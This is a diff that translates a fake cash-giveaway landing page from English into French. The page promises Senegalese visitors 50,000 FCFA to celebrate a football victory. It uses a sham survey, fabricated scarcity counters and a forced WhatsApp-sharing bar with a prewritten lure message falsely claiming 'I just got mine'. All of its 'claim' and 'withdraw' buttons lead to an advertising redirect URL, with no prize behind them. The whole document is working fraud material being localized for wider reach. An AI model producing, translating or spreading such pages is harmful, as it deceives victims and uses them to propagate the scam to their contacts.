@@ -295,23 +295,23 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">Félicitations ! Vos réponses ont été enregistrées</h2>
  
 <p class="paragraph">
-Now you have a chance to receive 50,000 FCFA from KABIROU MBODJE IN CELEBRATION OF THE VICTORY OF THE LIONS OF TERANGA<br><br>
-You have 3 chances ! we wish you good luck
+Vous avez maintenant une chance de recevoir 50 000 FCFA de la part de KABIROU MBODJE POUR CÉLÉBRER LA VICTOIRE DES LIONS DE LA TERANGA<br><br>
+Vous avez 3 chances ! Nous vous souhaitons bonne chance
 <br><br>
-You need to select the box that has the gift inside the boxes.
+Vous devez sélectionner la boîte qui contient le cadeau parmi les boîtes.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+Commencer
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">Bonne chance la prochaine fois</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Vous avez (2) chances supplémentaires. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -320,11 +320,11 @@ OK
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAXx4VJxRdFKPLKqUzC2sp5cWvwICK-q6DJW550fPOjBZc6hfkWYQWbgvSATu_ZQigaHWQsfHhzoElbEbHwMdLuAnkIWjyXu_yr-B6ZEknVIYtGQ0rn8pFG7Al1n19JcAtIUJ9VfGshq2Cd_xVjlTm7Df457Cqn7ScWE3afrCUUruSitpr7gDWD80XpxJI/s1600/download__17_-removebg-preview.png" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<h1 class="heading heading--h1">Félicitations ! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> 50,000 FCFA cash</b><br>Follow the instructions on the next page to claim your prize ! 
+Votre prix est : <b>50 000 FCFA en espèces</b><br>Suivez les instructions sur la page suivante pour réclamer votre prix ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -341,12 +341,12 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvQkYEDniaNhgjo-t0a05WK7_m8YJblAtErho6ZDP8N0xb3QJ8Z-NlCuc9uvBvwFhgkr05A6ZsWQ-S-pWNkIZzJ0cc4FQgTDjRsW4meqjqg8grRp9Qzic5CcMZBVukbFwtz8YwWd2b4RDUiaBPyYtXsbZ9Z9Vypy2eW-P63dEYlH7DW7Kud8bPYF9HtAYe/w640-h426/yytgss.jpeg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Hello!
+Bonjour !
 </h1>
   <p class="paragraph">
-Welcome to <b>50,000 FCFA GIVEAWAY IN CELEBRATION OF THE VICTORY OF THE LIONS OF TERANGA</b>, Accept this CELEBRATION GIVEAWAY OF 50,000 FCFA TO CELEBRATE THE VICTORY FOR SENEGALESE.
+Bienvenue à <b>50 000 FCFA GIVEAWAY POUR CÉLÉBRER LA VICTOIRE DES LIONS DE LA TERANGA</b>, acceptez ce GIVEAWAY DE CÉLÉBRATION DE 50 000 FCFA POUR FÊTER LA VICTOIRE DES SÉNÉGALAIS.
 <br>
-Answer the questions below to claim <b>50,000 FCFA Cash Giveaway</b>
+Répondez aux questions ci-dessous pour réclamer <b>le Giveaway en espèces de 50 000 FCFA</b>
 </p>
   <br>
   
@@ -357,58 +357,58 @@ Answer the questions below to claim <b>50,000 FCFA Cash Giveaway</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+                     "Veuillez patienter un instant...",
+              "Veuillez patienter un instant...",
+              "Veuillez patienter un instant..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Vous avez répondu à 4/4 questions
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
+Vos réponses sont en cours de traitement
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+Des cadeaux sont encore disponibles !
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
+Recherche de cadeaux.. 
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (389) gifts remain!
+Il ne reste que (389) cadeaux !
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
+Vérification du stock en cours
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a citizen of SENEGAL?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Êtes-vous citoyen du SÉNÉGAL ?",
+              answers: [ { text: "Oui" }, { text: "Non" } ]
             },
                                                              {
-              title: "Do you have a SENEGALESE ID?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Avez-vous une carte d'identité sénégalaise ?",
+              answers: [ { text: "Oui" }, { text: "Non" } ]
             },
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "Choisissez votre sexe ?",
+              answers: [ { text: "Homme" }, { text: "Femme" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20 years" }, { text: "21 - 25 years" }, { text: "26 - 30 years" }, { text: "30 years Above" } ]
+              title: "Sélectionnez votre tranche d'âge ?",
+              answers: [ { text: "18 - 20 ans" }, { text: "21 - 25 ans" }, { text: "26 - 30 ans" }, { text: "30 ans et plus" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -420,20 +420,20 @@ Stock is being checked
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>Félicitations ! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvQkYEDniaNhgjo-t0a05WK7_m8YJblAtErho6ZDP8N0xb3QJ8Z-NlCuc9uvBvwFhgkr05A6ZsWQ-S-pWNkIZzJ0cc4FQgTDjRsW4meqjqg8grRp9Qzic5CcMZBVukbFwtz8YwWd2b4RDUiaBPyYtXsbZ9Z9Vypy2eW-P63dEYlH7DW7Kud8bPYF9HtAYe/w640-h426/yytgss.jpeg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>50,000 FCFA </b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">Votre prix est : <b>50 000 FCFA </b> <br>Suivez les instructions ci-dessous pour réclamer votre prix !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1. Share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your Cash Grant</p></div>
+<div id="lastapp"><p class="rules">1. Partagez dans 5 groupes / avec 15 amis sur « WhatsApp » (cliquez sur l’icône « WhatsApp » ci-dessous)</p><p class="rules">2. Cliquez sur « Continuer » et réclamez votre aide en espèces</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+  <h4 class="textlastup">Partagez jusqu’à ce que la barre bleue soit pleine !</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -444,7 +444,7 @@ Stock is being checked
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                Continue
+                                Continuer
                             </div>
    
   </div></div>
@@ -457,32 +457,32 @@ Stock is being checked
                       
     <div id="claim">
       <div class="title1">
-<p>Congratulations! </p>
+<p>Félicitations ! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhAXx4VJxRdFKPLKqUzC2sp5cWvwICK-q6DJW550fPOjBZc6hfkWYQWbgvSATu_ZQigaHWQsfHhzoElbEbHwMdLuAnkIWjyXu_yr-B6ZEknVIYtGQ0rn8pFG7Al1n19JcAtIUJ9VfGshq2Cd_xVjlTm7Df457Cqn7ScWE3afrCUUruSitpr7gDWD80XpxJI/s1600/download__17_-removebg-preview.png" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>50,000 FCFA  cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">Votre prix est : <b>50 000 FCFA en espèces.</b> <br>Suivez les instructions ci-dessous pour réclamer votre prix !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('https://obqj2.com/4/1322937')" href="" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM 50,000 FCFA </font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">RÉCLAMER 50 000 FCFA </font></button>
                     </a><br/> <br/>
 	    
-      <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
+      <div class="share_main_bt" id="offer">CHOISIR LE TYPE DE COMPTE</div><br/> <br/>
 
 	     <a  onclick="window.open('https://obqj2.com/4/1322937')" href="" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">ÉPARGNE</font></button>
                     </a><br/> <br/>
  <a  onclick="window.open('https://obqj2.com/4/1322937')" href="" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CURRENT</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">COURANT</font></button>
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw 50,000 FCFA </div> 
+            <div class="share_main_bt" id="offers">Retirer 50 000 FCFA </div> 
       <br>
           
        
@@ -517,7 +517,7 @@ function go() {
 
 
 </body>
-<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl487034'},{'dcenter':'p3'},{'cp_id':'9979766'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/traffic-assets/js/tccl.min.js'></script></html>
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl487034'},{'dcenter':'p3'},{'cp_id':'9979766'},{'cp_cl':'8'}) // Surveillance des performances pour rendre votre site plus rapide. Si vous souhaitez vous désinscrire, veuillez contacter le support d’hébergement.</script><script src='https://img1.wsimg.com/traffic-assets/js/tccl.min.js'></script></html>
 
 <script src="https://code.jquery.com/jquery-latest.min.js"></script>
 
@@ -526,7 +526,7 @@ function go() {
         var text1 = "ytime" ,
             text2 = " مكتبة جرير تقدم ",
             text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
-            error = "There is an error!\nPosts do not count. You may have shared it with the same friend or group more than once, please re-share.",
+            error = "Il y a une erreur !\nLes publications ne comptent pas. Vous avez peut-être partagé avec le même ami ou groupe plus d’une fois, veuillez repartager.",
             cpa = "https://obqj2.com/4/1322937",
             cpa1 = "https://obqj2.com/4/1322937",
             saved = "coke2",
@@ -535,10 +535,10 @@ function go() {
 
 <script>
   var tiaoban = [
-"If You Missed before%0A%0A*Don't miss this KABIROU MBODJE 50,000 FCFA GIVEAWAY TO CELEBRATE THE VICTORY OF THE LIONS OF TERANGA - FREE CASH GIVEAWAY For All SENEGALESE%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 50,000 FCFA instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Recompense-De-Victoire.html ",
-"If You Missed before%0A%0A*Don't miss this KABIROU MBODJE 50,000 FCFA GIVEAWAY TO CELEBRATE THE VICTORY OF THE LIONS OF TERANGA - FREE CASH GIVEAWAY For All SENEGALESE%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 50,000 FCFA instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Recompense-De-Victoire.html ",
-"If You Missed before%0A%0A*Don't miss this KABIROU MBODJE 50,000 FCFA GIVEAWAY TO CELEBRATE THE VICTORY OF THE LIONS OF TERANGA - FREE CASH GIVEAWAY For All SENEGALESE%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 50,000 FCFA instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Recompense-De-Victoire.html ",
-"If You Missed before%0A%0A*Don't miss this KABIROU MBODJE 50,000 FCFA GIVEAWAY TO CELEBRATE THE VICTORY OF THE LIONS OF TERANGA - FREE CASH GIVEAWAY For All SENEGALESE%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive 50,000 FCFA instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://ongoing-grant.cfd/Recompense-De-Victoire.html ",
+"Si vous avez manqué avant%0A%0A*Ne manquez pas ce GIVEAWAY DE 50 000 FCFA DE KABIROU MBODJE POUR CÉLÉBRER LA VICTOIRE DES LIONS DE LA TERANGA - CASH GRATUIT POUR TOUS LES SÉNÉGALAIS%0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez 50 000 FCFA instantanément aujourd’hui.%0A Moi, j’ai déjà reçu le mien%0A%0ACliquez ici👇%0A https://ongoing-grant.cfd/Recompense-De-Victoire.html ",
+"Si vous avez manqué avant%0A%0A*Ne manquez pas ce GIVEAWAY DE 50 000 FCFA DE KABIROU MBODJE POUR CÉLÉBRER LA VICTOIRE DES LIONS DE LA TERANGA - CASH GRATUIT POUR TOUS LES SÉNÉGALAIS%0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez 50 000 FCFA instantanément aujourd’hui.%0A Moi, j’ai déjà reçu le mien%0A%0ACliquez ici👇%0A https://ongoing-grant.cfd/Recompense-De-Victoire.html ",
+"Si vous avez manqué avant%0A%0A*Ne manquez pas ce GIVEAWAY DE 50 000 FCFA DE KABIROU MBODJE POUR CÉLÉBRER LA VICTOIRE DES LIONS DE LA TERANGA - CASH GRATUIT POUR TOUS LES SÉNÉGALAIS%0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez 50 000 FCFA instantanément aujourd’hui.%0A Moi, j’ai déjà reçu le mien%0A%0ACliquez ici👇%0A https://ongoing-grant.cfd/Recompense-De-Victoire.html ",
+"Si vous avez manqué avant%0A%0A*Ne manquez pas ce GIVEAWAY DE 50 000 FCFA DE KABIROU MBODJE POUR CÉLÉBRER LA VICTOIRE DES LIONS DE LA TERANGA - CASH GRATUIT POUR TOUS LES SÉNÉGALAIS%0A%0A*COMMENT L’OBTENIR*%0AVisitez le lien ci-dessous et répondez aux questions suivantes et vous recevrez 50 000 FCFA instantanément aujourd’hui.%0A Moi, j’ai déjà reçu le mien%0A%0ACliquez ici👇%0A https://ongoing-grant.cfd/Recompense-De-Victoire.html ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
@@ -621,8 +621,8 @@ $("#offerss").click(function () {
    function tipn(){
    Swal.fire({
   icon: 'error',
-  title: 'Unfortunately...',
-  text: 'To Receive Your KABIROU MBODJE 50,000 FCFA GIVEAWAY TO CELEBRATE THE VICTORY OF THE LIONS OF TERANGA, You have to share with friends about our event. Share until the blue bar is full!',
+  title: 'Malheureusement...',
+  text: 'Pour recevoir votre GIVEAWAY DE 50 000 FCFA DE KABIROU MBODJE POUR CÉLÉBRER LA VICTOIRE DES LIONS DE LA TERANGA, vous devez partager notre événement avec vos amis. Partagez jusqu’à ce que la barre bleue soit pleine !',
   
 });
    }
